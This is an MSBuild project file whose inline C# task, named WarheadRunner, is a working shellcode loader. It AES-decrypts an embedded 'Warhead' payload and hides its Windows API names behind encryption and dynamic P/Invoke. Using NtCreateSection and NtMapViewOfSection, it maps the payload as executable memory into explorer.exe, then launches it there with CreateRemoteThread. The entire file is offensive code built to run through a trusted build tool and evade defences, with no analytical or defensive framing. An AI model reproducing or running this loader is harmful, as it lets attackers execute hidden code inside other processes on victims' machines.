<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">

<Target Name="ExecuteWarhead">
<WarheadRunner />
</Target>

<UsingTask TaskName="WarheadRunner" TaskFactory="CodeTaskFactory"
AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
<Task>
<Code Type="Class" Language="cs">
<![CDATA[
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Reflection.Emit;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class WarheadRunner : Microsoft.Build.Utilities.Task
{
    static string GlobalKey = "kB7MlmGGGjmny4iajy4nEVkML3LaTiB3bm/5W6h+vOY=";
    static string GlobalIV = "T81+A1chkrRMyxrFgY6Yow==";

    static byte[] dsystem_dll_Bytes = new byte[16] { 0x18, 0x31, 0xEE, 0xA0, 0xAC, 0x3B, 0xB9, 0x7A, 0xC2, 0xCF, 0x64, 0x63, 0xCD, 0x68, 0x0A, 0x00 };
    static string dsystem_dll = DecryptAESAsString(dsystem_dll_Bytes, GlobalKey, GlobalIV);

    static byte[] dGetProcAddress_Bytes = new byte[16] { 0x6D, 0x39, 0xE9, 0xE8, 0x7B, 0x7D, 0x28, 0x33, 0x7B, 0xF6, 0xAA, 0xC7, 0x54, 0x6C, 0x44, 0xB9 };
    static string dGetProcAddress = DecryptAESAsString(dGetProcAddress_Bytes, GlobalKey, GlobalIV);

    static byte[] dGetModuleHandle_Bytes = new byte[16] { 0x8F, 0x69, 0xBE, 0x27, 0x01, 0x18, 0x0E, 0x33, 0xF2, 0x73, 0xC1, 0x4A, 0x34, 0x43, 0xEA, 0x13 };
    static string dGetModuleHandle = DecryptAESAsString(dGetModuleHandle_Bytes, GlobalKey, GlobalIV);

    static byte[] dMicrosoft_Win32_UnsafeNativeMethods_Bytes = new byte[48] { 0x3B, 0xF3, 0x89, 0x9F, 0x93, 0x24, 0x57, 0xD8, 0x88, 0x5B, 0x0A, 0xAE, 0xE4, 0x5C, 0x7B, 0x39, 0x9C, 0x72, 0xAF, 0xA5, 0x59, 0x4A, 0xCB, 0x32, 0xCE, 0xE0, 0x4E, 0x23, 0xD0, 0xBB, 0x06, 0x10, 0x00, 0x58, 0x12, 0x43, 0x92, 0xC7, 0xBF, 0x25, 0x40, 0x59, 0x67, 0x92, 0x6B, 0x80, 0xC5, 0x64 };
    static string dMicrosoft_Win32_UnsafeNativeMethods = DecryptAESAsString(dMicrosoft_Win32_UnsafeNativeMethods_Bytes, GlobalKey, GlobalIV);

    static byte[] dKernel32_dll_Bytes = new byte[16] { 0xA0, 0x46, 0xF6, 0xF7, 0x22, 0xED, 0x93, 0x28, 0xFE, 0xFE, 0x95, 0x7D, 0x73, 0xEA, 0x93, 0x4A };
    static string dKernel32_dll = DecryptAESAsString(dKernel32_dll_Bytes, GlobalKey, GlobalIV);

    static byte[] dReflectedDelegate_Bytes = new byte[32] { 0x8C, 0x8F, 0x3B, 0x84, 0x1A, 0xD3, 0x30, 0x4F, 0xE1, 0x6F, 0x9B, 0x16, 0x93, 0xE9, 0x1C, 0xFC, 0x2C, 0xBF, 0xEE, 0x4E, 0x20, 0x44, 0xAE, 0xAA, 0x32, 0xA2, 0x4D, 0x94, 0x1A, 0x2E, 0x2B, 0xAF };
    static string dReflectedDelegate = DecryptAESAsString(dReflectedDelegate_Bytes, GlobalKey, GlobalIV);

    static byte[] dInMemoryModule_Bytes = new byte[16] { 0x49, 0xB9, 0x77, 0x0D, 0x03, 0x12, 0xF1, 0x39, 0x8D, 0x8F, 0x67, 0x1E, 0xB8, 0x36, 0x60, 0x27 };
    static string dInMemoryModule = DecryptAESAsString(dInMemoryModule_Bytes, GlobalKey, GlobalIV);

    static byte[] dntdll_dll_Bytes = new byte[16] { 0x54, 0x91, 0x7E, 0xBC, 0x02, 0xA0, 0x96, 0x95, 0x3E, 0x6C, 0xC6, 0xB2, 0x55, 0x94, 0x4C, 0xAA };
    static string dntdll_dll = DecryptAESAsString(dntdll_dll_Bytes, GlobalKey, GlobalIV);

    static byte[] dOpenProcess_Bytes = new byte[16] { 0x5B, 0x01, 0xB4, 0x66, 0xB2, 0xE3, 0x94, 0x77, 0x23, 0x9B, 0xF5, 0x29, 0x0D, 0xFF, 0xCB, 0xE1 };
    static string dOpenProcess = DecryptAESAsString(dOpenProcess_Bytes, GlobalKey, GlobalIV);

    static byte[] dCreateRemoteThread_Bytes = new byte[32] { 0x97, 0x71, 0xF2, 0x89, 0x04, 0xD3, 0x34, 0x11, 0x6A, 0x99, 0x9E, 0x79, 0x4A, 0xA4, 0x82, 0xB1, 0x9B, 0x8B, 0x71, 0x33, 0xFC, 0x16, 0x24, 0x4A, 0x88, 0xCC, 0x53, 0x68, 0x71, 0x93, 0xD2, 0xC1 };
    static string dCreateRemoteThread = DecryptAESAsString(dCreateRemoteThread_Bytes, GlobalKey, GlobalIV);

    static byte[] dNtClose_Bytes = new byte[16] { 0xCF, 0xEC, 0x07, 0x71, 0xD2, 0x7E, 0xD2, 0x18, 0x1C, 0xBF, 0xDF, 0x50, 0x54, 0xCC, 0x2E, 0x08 };
    static string dNtClose = DecryptAESAsString(dNtClose_Bytes, GlobalKey, GlobalIV);

    static byte[] dNtCreateSection_Bytes = new byte[16] { 0xEF, 0x6C, 0x16, 0xD8, 0xC1, 0x23, 0xCC, 0xFE, 0x36, 0x6A, 0x97, 0xA0, 0x63, 0x9A, 0x07, 0x7F };
    static string dNtCreateSection = DecryptAESAsString(dNtCreateSection_Bytes, GlobalKey, GlobalIV);

    static byte[] dNtMapViewOfSection_Bytes = new byte[32] { 0xE6, 0x35, 0xAB, 0xC6, 0xCD, 0x21, 0x7B, 0x01, 0x1D, 0xD5, 0x7D, 0xEC, 0x32, 0xD5, 0x3C, 0xEF, 0xA3, 0x06, 0x3E, 0xF6, 0x7B, 0x5A, 0xE2, 0x4E, 0x79, 0x4D, 0xB5, 0xB1, 0xB2, 0x92, 0x80, 0xB3 };
    static string dNtMapViewOfSection = DecryptAESAsString(dNtMapViewOfSection_Bytes, GlobalKey, GlobalIV);

    static byte[] dNtUnmapViewOfSection_Bytes = new byte[32] { 0xA1, 0x74, 0xCD, 0x6C, 0xBA, 0xFC, 0x91, 0xB5, 0xF9, 0x3A, 0x13, 0x59, 0x18, 0x6B, 0x37, 0x5A, 0x13, 0x79, 0x69, 0xD2, 0x77, 0x6F, 0x6A, 0x6A, 0xE0, 0x03, 0x42, 0x33, 0x62, 0xC8, 0xB0, 0x8B };
    static string dNtUnmapViewOfSection = DecryptAESAsString(dNtUnmapViewOfSection_Bytes, GlobalKey, GlobalIV);

    static byte[] dGetCurrentProcess_Bytes = new byte[32] { 0xA1, 0x40, 0xD5, 0xD0, 0xD9, 0xB7, 0xB5, 0x6C, 0x71, 0x5D, 0x29, 0x47, 0x2A, 0x5A, 0xDA, 0xAB, 0xA3, 0xBB, 0x45, 0xB8, 0x74, 0x31, 0x6F, 0xB4, 0x8B, 0xFB, 0xFF, 0x14, 0x17, 0x0D, 0x81, 0x8D };
    static string dGetCurrentProcess = DecryptAESAsString(dGetCurrentProcess_Bytes, GlobalKey, GlobalIV);
    public static object DynamicInvoke(Type returnType, string library, string methodName, object[] argumentTypes, Type[] parameterTypes)
    {
        var assemblyName = new AssemblyName("DynamicAssembly");
        var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
        var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

        var methodBuilder = moduleBuilder.DefinePInvokeMethod(
            methodName,
            library,
            MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
            CallingConventions.Standard,
            returnType,
            parameterTypes,
            CallingConvention.Winapi,
            CharSet.Ansi
        );

        methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
        moduleBuilder.CreateGlobalFunctions();
        MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

        return dynamicMethod.Invoke(null, argumentTypes);
    }
    public static IntPtr fOpenProcess(uint processAccess, bool bInheritHandle, uint processId)
    {
        var parameterTypes = new Type[] { typeof(uint), typeof(bool), typeof(uint) };
        var argumentTypes = new object[] { processAccess, bInheritHandle, processId };
        return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dOpenProcess, argumentTypes, parameterTypes);
    }

    public static IntPtr fCreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
    {
        var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
        var argumentTypes = new object[] { hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
        return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dCreateRemoteThread, argumentTypes, parameterTypes);
    }

    public static IntPtr fGetCurrentProcess()
    {
        var parameterTypes = new Type[] { };
        var argumentTypes = new object[] { };
        return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dGetCurrentProcess, argumentTypes, parameterTypes);
    }

    public static UInt32 fNtCreateSection(ref IntPtr section, UInt32 desiredAccess, IntPtr pAttrs, ref long MaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile)
    {
        var parameterTypes = new Type[] { typeof(IntPtr).MakeByRefType(), typeof(UInt32), typeof(IntPtr), typeof(long).MakeByRefType(), typeof(UInt32), typeof(UInt32), typeof(IntPtr) };
        var argumentTypes = new object[] { section, desiredAccess, pAttrs, MaxSize, pageProt, allocationAttribs, hFile };
        UInt32 result = (UInt32)DynamicInvoke(typeof(UInt32), dntdll_dll, dNtCreateSection, argumentTypes, parameterTypes);

        section = (IntPtr)argumentTypes[0];
        MaxSize = (long)argumentTypes[3];

        return result;
    }

    public static UInt32 fNtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, ref long SectionOffset, ref long ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect)
    {
        var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(IntPtr).MakeByRefType(), typeof(IntPtr), typeof(IntPtr), typeof(long).MakeByRefType(), typeof(long).MakeByRefType(), typeof(uint), typeof(uint), typeof(uint) };
        var argumentTypes = new object[] { SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect };
        UInt32 result = (UInt32)DynamicInvoke(typeof(UInt32), dntdll_dll, dNtMapViewOfSection, argumentTypes, parameterTypes);

        BaseAddress = (IntPtr)argumentTypes[2];
        SectionOffset = (long)argumentTypes[5];
        ViewSize = (long)argumentTypes[6];

        return result;
    }

    public static uint fNtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr)
    {
        var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr) };
        var argumentTypes = new object[] { hProc, baseAddr };
        return (uint)DynamicInvoke(typeof(uint), dntdll_dll, dNtUnmapViewOfSection, argumentTypes, parameterTypes);
    }

    public static int fNtClose(IntPtr hObject)
    {
        var parameterTypes = new Type[] { typeof(IntPtr) };
        var argumentTypes = new object[] { hObject };
        return (int)DynamicInvoke(typeof(int), dntdll_dll, dNtClose, argumentTypes, parameterTypes);
    }

    public override bool Execute()
    {

        byte[] Warhead_Bytes = new byte[304] { 0x4C, 0x1E, 0x97, 0x81, 0xBC, 0xCD, 0x36, 0x58, 0x72, 0xCF, 0x42, 0x97, 0x7B, 0x5C, 0x81, 0x9B, 0x44, 0x43, 0x03, 0x2D, 0x81, 0xF1, 0x2F, 0x14, 0xA8, 0xD8, 0xB6, 0x13, 0x1F, 0x03, 0xC0, 0xC9, 0x06, 0x45, 0xE6, 0x0D, 0x00, 0x2A, 0x77, 0xFE, 0x0A, 0xC0, 0x51, 0xF1, 0x93, 0x0C, 0x5E, 0x6E, 0x1B, 0xC9, 0x2F, 0x6D, 0xD4, 0x10, 0xDD, 0x2F, 0x75, 0x9A, 0xB5, 0x5B, 0x22, 0x7C, 0x52, 0xD2, 0xB8, 0xC7, 0x9B, 0x02, 0xAC, 0x7E, 0xBF, 0x68, 0x83, 0xF9, 0xBB, 0x82, 0xD1, 0x65, 0xFC, 0xEB, 0x7C, 0xDB, 0xC8, 0x92, 0xFB, 0x53, 0x57, 0xA6, 0x54, 0x3B, 0x35, 0x5A, 0x38, 0x80, 0x61, 0x55, 0xE2, 0xC8, 0xDD, 0xDA, 0x14, 0x33, 0xB5, 0x4B, 0xB8, 0x34, 0xAE, 0x1C, 0x1D, 0x7C, 0xA9, 0x48, 0x9E, 0xB3, 0xAE, 0x5E, 0x6F, 0xD3, 0xA4, 0xA7, 0x9B, 0x78, 0xB2, 0x78, 0x3A, 0xF2, 0xFD, 0xE8, 0x52, 0xD0, 0x9B, 0xB6, 0x02, 0x8B, 0xEE, 0xA9, 0xEF, 0x63, 0xE3, 0x1F, 0xFA, 0x2A, 0x85, 0x01, 0xF3, 0xA5, 0x3D, 0xD7, 0x55, 0x79, 0x4F, 0xB4, 0xAE, 0x8A, 0x4D, 0x43, 0x27, 0x6D, 0xB3, 0xBA, 0x73, 0x6A, 0x2C, 0xCF, 0xA6, 0x03, 0x7B, 0x40, 0xC1, 0xFE, 0xDA, 0x6C, 0x33, 0x59, 0xD5, 0x3E, 0xC5, 0xBD, 0x86, 0xCF, 0x76, 0xC1, 0xF0, 0xF1, 0x5A, 0x3F, 0x39, 0x92, 0xD7, 0xBA, 0x5F, 0xDA, 0xD8, 0x81, 0x78, 0xF6, 0x30, 0x18, 0x70, 0xA2, 0x04, 0x44, 0xD7, 0xA1, 0xFE, 0xED, 0x9E, 0xB6, 0x29, 0xAB, 0x7F, 0x9E, 0x77, 0xF5, 0xDA, 0x14, 0x7D, 0xB5, 0xDA, 0x42, 0x8A, 0xB2, 0x9F, 0x36, 0x70, 0xC5, 0x72, 0x13, 0x1D, 0x9C, 0xB6, 0xA2, 0xC2, 0x66, 0xE8, 0xE7, 0x84, 0xEB, 0x03, 0x46, 0x8D, 0x79, 0xB8, 0x28, 0x02, 0x09, 0xAB, 0xCB, 0xCC, 0x61, 0x30, 0xBA, 0xE7, 0x41, 0x23, 0x43, 0xC1, 0xBD, 0x02, 0xE2, 0xAB, 0x67, 0xAC, 0xB2, 0xC7, 0xC4, 0x56, 0x32, 0x67, 0x37, 0xBE, 0x18, 0x99, 0x8A, 0x59, 0x98, 0x0C, 0x8E, 0xA8, 0xFE, 0xAA, 0x29, 0xC9, 0x99, 0x2C, 0x1F, 0x63, 0x7D, 0x5C, 0x32, 0x9E, 0x37, 0xC2, 0xAE, 0xCE, 0x40, 0x77, 0xB9, 0x28, 0x86, 0x83, 0x6B, 0x3F, 0xDF };
        byte[] Warhead = DecryptAESAsBytes(Warhead_Bytes, "MeV1w5NXp6srqE5/qDN0lSLfu9J4opVHRcoYR1mmBzk=", "hTFZdUSVkNnMMRnI5uG36A==");

        long buffer_size = Warhead.Length;

        IntPtr ptr_section_handle = IntPtr.Zero;
        UInt32 create_section_status = fNtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);

        long local_section_offset = 0;
        IntPtr ptr_local_section_addr = IntPtr.Zero;
        UInt32 local_map_view_status = fNtMapViewOfSection(ptr_section_handle, fGetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);

        Marshal.Copy(Warhead, 0, ptr_local_section_addr, Warhead.Length);

        var process = Process.GetProcessesByName("explorer")[0];
        IntPtr hProcess = fOpenProcess(0x001F0FFF, false, (uint)process.Id);
        IntPtr ptr_remote_section_addr = IntPtr.Zero;
        UInt32 remote_map_view_status = fNtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

        fNtUnmapViewOfSection(fGetCurrentProcess(), ptr_local_section_addr);
        fNtClose(ptr_section_handle);

        fCreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
        return true;
    }

    static string DecryptAESAsString(byte[] data, string keyBase64, string ivBase64)
    {
        byte[] WarheadBytes = DecryptAESAsBytes(data, keyBase64, ivBase64);
        return Encoding.UTF8.GetString(WarheadBytes);
    }

    static byte[] DecryptAESAsBytes(byte[] data, string keyBase64, string ivBase64)
    {
        byte[] key = Convert.FromBase64String(keyBase64);
        byte[] iv = Convert.FromBase64String(ivBase64);

        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;

            using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
            using (MemoryStream memoryStream = new MemoryStream(data))
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
            {
                byte[] WarheadBytes = new byte[data.Length];
                int WarheadByteCount = cryptoStream.Read(WarheadBytes, 0, WarheadBytes.Length);

                byte[] result = new byte[WarheadByteCount];
                Array.Copy(WarheadBytes, result, WarheadByteCount);
                return result;
            }
        }
    }
}
]]>
</Code>
</Task>
</UsingTask>
</Project>
